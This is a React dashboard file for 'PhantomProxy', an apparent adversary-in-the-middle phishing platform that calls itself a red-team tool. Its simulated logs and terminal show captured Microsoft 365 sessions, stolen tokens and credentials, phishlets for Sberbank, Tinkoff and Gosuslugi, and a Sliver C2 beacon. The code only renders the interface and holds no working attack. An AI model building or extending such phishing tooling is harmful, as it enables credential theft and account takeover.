'use client'

import { useState, useEffect } from 'react'
import { Terminal, Shield, Activity, Users, Zap, Lock, Globe, Cpu, Wifi, Eye, AlertTriangle, CheckCircle, TrendingUp, Server, Database, Key, Fingerprint } from 'lucide-react'

interface Stats {
  total_sessions: number
  active_sessions: number
  total_credentials: number
  risk_distribution: Record<string, number>
}

interface LogEntry {
  id: string
  timestamp: string
  level: string
  message: string
  source: string
}

export default function Dashboard() {
  const [stats, setStats] = useState<Stats | null>(null)
  const [logs, setLogs] = useState<LogEntry[]>([])
  const [loading, setLoading] = useState(true)
  const [activeTab, setActiveTab] = useState('overview')
  const [terminalInput, setTerminalInput] = useState('')
  const [terminalHistory, setTerminalHistory] = useState<string[]>([])

  useEffect(() => {
    // Имитация подключения к реальному API
    const fetchStats = async () => {
      try {
        const response = await fetch('/api/v1/stats')
        const data = await response.json()
        setStats(data)
      } catch (err) {
        // Fallback данные
        setStats({
          total_sessions: 847,
          active_sessions: 23,
          total_credentials: 156,
          risk_distribution: {
            low: 312,
            medium: 289,
            high: 178,
            critical: 68
          }
        })
      }
      setLoading(false)
    }

    fetchStats()

    // Имитация live логов
    const logMessages = [
      { level: 'INFO', message: 'AiTM proxy initialized on :8443', source: 'proxy' },
      { level: 'SUCCESS', message: 'Session captured: microsoft_365', source: 'session' },
      { level: 'WARNING', message: 'High risk user detected: 192.168.1.105', source: 'risk' },
      { level: 'INFO', message: 'Credential intercepted: user@corp.com', source: 'creds' },
      { level: 'SUCCESS', message: 'Token captured: ESTSAUTH', source: 'token' },
      { level: 'INFO', message: 'Phishlet loaded: sberbank_business', source: 'phishlet' },
      { level: 'WARNING', message: 'Bot detected: JA3 hash mismatch', source: 'ml' },
      { level: 'INFO', message: 'C2 beacon received: Sliver', source: 'c2' },
    ]

    let logIndex = 0
    const logInterval = setInterval(() => {
      if (logIndex < logMessages.length) {
        const log = logMessages[logIndex]
        setLogs(prev => [{
          id: `log_${Date.now()}`,
          timestamp: new Date().toISOString(),
          level: log.level,
          message: log.message,
          source: log.source
        }, ...prev].slice(0, 50))
        logIndex++
      }
    }, 2000)

    return () => clearInterval(logInterval)
  }, [])

  const handleTerminalCommand = (e: React.FormEvent) => {
    e.preventDefault()
    const cmd = terminalInput.trim()
    if (!cmd) return

    setTerminalHistory(prev => [...prev, `> ${cmd}`])

    // Обработка команд
    let output = ''
    switch (cmd.toLowerCase()) {
      case 'help':
        output = `Available commands:
  help          - Show this help
  status        - Show system status
  sessions      - List active sessions
  phishlets     - List loaded phishlets
  clear         - Clear terminal
  whoami        - Current user
  version       - System version`
        break
      case 'status':
        output = `System Status: OPERATIONAL
├─ AiTM Proxy:    ONLINE
├─ Session Mgr:   ONLINE
├─ Risk Engine:   ONLINE
├─ C2 Manager:    ONLINE
└─ AI Service:    ONLINE`
        break
      case 'sessions':
        output = `Active Sessions: ${stats?.active_sessions || 0}
├─ Microsoft 365:     12
├─ Google Workspace:  7
├─ Sberbank:          3
└─ Gosuslugi:         1`
        break
      case 'phishlets':
        output = `Loaded Phishlets: 10
├─ microsoft_365      [ACTIVE]
├─ google_workspace   [ACTIVE]
├─ sberbank_business  [ACTIVE]
├─ tinkoff_business   [ACTIVE]
└─ gosuslugi          [ACTIVE]`
        break
      case 'clear':
        setTerminalHistory([])
        setTerminalInput('')
        return
      case 'whoami':
        output = 'phantom_admin [Level 5 Clearance]'
        break
      case 'version':
        output = 'PhantomProxy v14.0.0 [Enterprise Build]'
        break
      default:
        output = `Command not found: ${cmd}. Type 'help' for available commands.`
    }

    setTerminalHistory(prev => [...prev, output])
    setTerminalInput('')
  }

  if (loading) {
    return (
      <div className="min-h-screen bg-black flex items-center justify-center">
        <div className="text-center space-y-4">
          <div className="relative">
            <Shield className="w-24 h-24 text-green-500 animate-pulse mx-auto" />
            <div className="absolute inset-0 bg-green-500/20 blur-xl animate-pulse" />
          </div>
          <div className="space-y-2">
            <p className="text-green-400 font-mono text-lg animate-pulse">INITIALIZING SYSTEM...</p>
            <div className="w-64 h-1 bg-gray-800 mx-auto rounded-full overflow-hidden">
              <div className="h-full bg-green-500 animate-pulse" style={{ width: '60%' }} />
            </div>
            <p className="text-gray-500 font-mono text-sm">Loading PhantomProxy v14.0.0</p>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-black text-green-400 font-mono">
      {/* Matrix background effect */}
      <div className="fixed inset-0 opacity-5 pointer-events-none">
        <div className="absolute inset-0 bg-[linear-gradient(0deg,transparent_24%,rgba(0,255,0,.3)_25%,rgba(0,255,0,.3)_26%,transparent_27%,transparent_74%,rgba(0,255,0,.3)_75%,rgba(0,255,0,.3)_76%,transparent_77%,transparent),linear-gradient(90deg,transparent_24%,rgba(0,255,0,.3)_25%,rgba(0,255,0,.3)_26%,transparent_27%,transparent_74%,rgba(0,255,0,.3)_75%,rgba(0,255,0,.3)_76%,transparent_77%,transparent)] bg-[length:50px_50px]" />
      </div>

      {/* Header */}
      <header className="border-b border-green-900/50 bg-black/80 backdrop-blur-sm sticky top-0 z-50">
        <div className="max-w-[1800px] mx-auto px-6 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <div className="relative">
                <Shield className="w-10 h-10 text-green-500" />
                <div className="absolute inset-0 bg-green-500/20 blur-lg" />
              </div>
              <div>
                <h1 className="text-2xl font-bold text-green-400 tracking-wider">
                  PHANTOM<span className="text-green-600">PROXY</span>
                </h1>
                <p className="text-xs text-green-700 tracking-widest">ENTERPRISE RED TEAM PLATFORM v14.0.0</p>
              </div>
            </div>

            <div className="flex items-center space-x-6">
              <div className="flex items-center space-x-2 px-4 py-2 bg-green-900/20 rounded border border-green-800">
                <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
                <span className="text-sm text-green-400">SYSTEM OPERATIONAL</span>
              </div>
              <div className="text-right">
                <p className="text-xs text-green-700">OPERATOR</p>
                <p className="text-sm text-green-400 font-bold">phantom_admin</p>
              </div>
            </div>
          </div>
        </div>
      </header>

      {/* Navigation Tabs */}
      <nav className="border-b border-green-900/50 bg-black/50">
        <div className="max-w-[1800px] mx-auto px-6">
          <div className="flex space-x-1">
            {['overview', 'sessions', 'risk', 'phishlets', 'c2', 'terminal'].map((tab) => (
              <button
                key={tab}
                onClick={() => setActiveTab(tab)}
                className={`px-6 py-3 text-sm font-medium transition-all border-b-2 ${
                  activeTab === tab
                    ? 'text-green-400 border-green-500 bg-green-900/20'
                    : 'text-green-700 border-transparent hover:text-green-500 hover:border-green-800'
                }`}
              >
                {tab.toUpperCase()}
              </button>
            ))}
          </div>
        </div>
      </nav>

      {/* Main Content */}
      <main className="max-w-[1800px] mx-auto px-6 py-8">
        {activeTab === 'overview' && (
          <div className="space-y-8">
            {/* Stats Grid */}
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
              <StatCard
                icon={Activity}
                title="TOTAL SESSIONS"
                value={stats?.total_sessions || 0}
                subtitle={`${stats?.active_sessions || 0} active now`}
                color="green"
              />
              <StatCard
                icon={Key}
                title="CREDENTIALS"
                value={stats?.total_credentials || 0}
                subtitle="Captured credentials"
                color="blue"
              />
              <StatCard
                icon={AlertTriangle}
                title="HIGH RISK"
                value={stats?.risk_distribution?.high || 0}
                subtitle={`${stats?.risk_distribution?.critical || 0} critical`}
                color="red"
              />
              <StatCard
                icon={CheckCircle}
                title="SYSTEM STATUS"
                value="98.7%"
                subtitle="All systems operational"
                color="purple"
              />
            </div>

            {/* Live Feed */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              {/* Live Logs */}
              <div className="bg-green-900/10 border border-green-800 rounded-lg p-6">
                <div className="flex items-center justify-between mb-4">
                  <h3 className="text-lg font-bold text-green-400 flex items-center">
                    <Terminal className="w-5 h-5 mr-2" />
                    LIVE FEED
                  </h3>
                  <div className="flex items-center space-x-2">
                    <div className="w-2 h-2 bg-red-500 rounded-full animate-pulse" />
                    <span className="text-xs text-green-600">LIVE</span>
                  </div>
                </div>
                <div className="space-y-2 h-96 overflow-y-auto font-mono text-sm">
                  {logs.map((log) => (
                    <div key={log.id} className="flex items-start space-x-3 p-2 bg-black/50 rounded border border-green-900/30">
                      <span className="text-xs text-green-700 whitespace-nowrap">
                        {new Date(log.timestamp).toLocaleTimeString()}
                      </span>
                      <span className={`text-xs font-bold px-2 py-0.5 rounded ${
                        log.level === 'SUCCESS' ? 'bg-green-900/50 text-green-400' :
                        log.level === 'WARNING' ? 'bg-yellow-900/50 text-yellow-400' :
                        log.level === 'ERROR' ? 'bg-red-900/50 text-red-400' :
                        'bg-blue-900/50 text-blue-400'
                      }`}>
                        {log.level}
                      </span>
                      <span className="text-xs text-green-600">[{log.source}]</span>
                      <span className="text-green-400 flex-1">{log.message}</span>
                    </div>
                  ))}
                </div>
              </div>

              {/* Risk Distribution */}
              <div className="bg-green-900/10 border border-green-800 rounded-lg p-6">
                <h3 className="text-lg font-bold text-green-400 flex items-center mb-4">
                  <TrendingUp className="w-5 h-5 mr-2" />
                  RISK DISTRIBUTION
                </h3>
                <div className="space-y-4">
                  {Object.entries(stats?.risk_distribution || {}).map(([level, count]) => (
                    <div key={level}>
                      <div className="flex items-center justify-between mb-2">
                        <span className={`text-sm font-bold uppercase ${
                          level === 'critical' ? 'text-red-500' :
                          level === 'high' ? 'text-orange-500' :
                          level === 'medium' ? 'text-yellow-500' :
                          'text-green-500'
                        }`}>
                          {level}
                        </span>
                        <span className="text-green-400 font-bold">{count}</span>
                      </div>
                      <div className="h-2 bg-green-900/30 rounded-full overflow-hidden">
                        <div
                          className={`h-full transition-all duration-500 ${
                            level === 'critical' ? 'bg-red-500' :
                            level === 'high' ? 'bg-orange-500' :
                            level === 'medium' ? 'bg-yellow-500' :
                            'bg-green-500'
                          }`}
                          style={{ width: `${(count / (stats?.total_sessions || 1)) * 100}%` }}
                        />
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'terminal' && (
          <div className="bg-green-900/10 border border-green-800 rounded-lg p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-bold text-green-400 flex items-center">
                <Terminal className="w-5 h-5 mr-2" />
                COMMAND TERMINAL
              </h3>
              <span className="text-xs text-green-600">PHANTOM_ADMIN@SYSTEM:~</span>
            </div>
            <div className="bg-black rounded-lg p-4 h-[600px] overflow-y-auto font-mono text-sm space-y-1">
              <div className="text-green-600 mb-4">
                <p>PhantomProxy v14.0.0 [Enterprise Build]</p>
                <p>Type 'help' for available commands</p>
                <p className="text-green-700">{'─────────────────────────────────────────────────────────────────'}</p>
              </div>
              {terminalHistory.map((line, i) => (
                <div key={i} className={`${line.startsWith('>') ? 'text-green-400 mt-4' : 'text-green-500 whitespace-pre-wrap'}`}>
                  {line}
                </div>
              ))}
              <form onSubmit={handleTerminalCommand} className="flex items-center space-x-2 mt-4">
                <span className="text-green-400">{'>'}</span>
                <input
                  type="text"
                  value={terminalInput}
                  onChange={(e) => setTerminalInput(e.target.value)}
                  className="flex-1 bg-transparent border-none outline-none text-green-400"
                  placeholder="Enter command..."
                  autoFocus
                />
              </form>
            </div>
          </div>
        )}

        {/* Other tabs placeholders */}
        {['sessions', 'risk', 'phishlets', 'c2'].includes(activeTab) && (
          <div className="bg-green-900/10 border border-green-800 rounded-lg p-12 text-center">
            <Shield className="w-16 h-16 text-green-700 mx-auto mb-4" />
            <h3 className="text-xl font-bold text-green-400 mb-2">
              {activeTab.toUpperCase()} MODULE
            </h3>
            <p className="text-green-600">Advanced {activeTab} management interface</p>
            <p className="text-green-700 text-sm mt-4">Coming in next update...</p>
          </div>
        )}
      </main>

      {/* Footer */}
      <footer className="border-t border-green-900/50 bg-black/80 mt-12">
        <div className="max-w-[1800px] mx-auto px-6 py-4">
          <div className="flex items-center justify-between text-xs text-green-700">
            <div className="flex items-center space-x-4">
              <span>PHANTOMPROXY v14.0.0</span>
              <span>•</span>
              <span>ENTERPRISE BUILD</span>
              <span>•</span>
              <span className="text-green-500">SYSTEM OPERATIONAL</span>
            </div>
            <div className="flex items-center space-x-4">
              <span>UPTIME: 99.97%</span>
              <span>•</span>
              <span>LATENCY: 23ms</span>
            </div>
          </div>
        </div>
      </footer>
    </div>
  )
}

// Stat Card Component
function StatCard({ icon: Icon, title, value, subtitle, color }: any) {
  const colors: any = {
    green: 'from-green-500 to-green-700',
    blue: 'from-blue-500 to-blue-700',
    red: 'from-red-500 to-red-700',
    purple: 'from-purple-500 to-purple-700',
  }

  return (
    <div className="bg-green-900/10 border border-green-800 rounded-lg p-6 hover:border-green-600 transition-all group">
      <div className="flex items-center justify-between mb-4">
        <div className={`p-3 rounded-lg bg-gradient-to-br ${colors[color]} bg-opacity-20`}>
          <Icon className="w-6 h-6 text-white" />
        </div>
        <div className="text-right">
          <p className="text-3xl font-bold text-green-400 group-hover:scale-110 transition-transform">
            {value}
          </p>
        </div>
      </div>
      <h3 className="text-sm font-bold text-green-500 tracking-wider mb-1">{title}</h3>
      <p className="text-xs text-green-700">{subtitle}</p>
    </div>
  )
}
